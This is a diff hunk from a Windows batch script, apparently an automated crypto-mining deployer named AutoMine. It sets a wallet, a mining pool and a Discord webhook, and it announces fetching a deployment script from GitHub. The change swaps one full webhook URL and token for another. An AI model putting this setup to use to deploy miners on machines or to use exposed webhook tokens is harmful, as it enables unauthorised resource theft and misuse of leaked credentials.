@@ -8,7 +8,7 @@ set "RAW_URL=https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/hea
 set "WALLET=R9vXXZ2AXz14qg2eKmdNbJBacg5T9Bx7Vz"
 set "POOL=us-rvn.2miners.com:6060"
 set "ALGO=kawpow"
-set "WEBHOOK=https://discord.com/api/webhooks/1211403523036676207/8IU_wuteeLQyFIwXSZwiakNwnEvy-hrzyHGYTj0Y2CGTa8nxwAYbzHkkcHS2hOQKfYcJ"
+set "WEBHOOK=https://discord.com/api/webhooks/1211888966391824447/jPqHkvBqXc9mB29gM0mivbS53KBHx8vz8utNbKIG14DmFfDkxybTIBJIOj7F7jmja6S3"
 :: ==============================================================================
 
 echo [*] Fetching deployment script from GitHub...
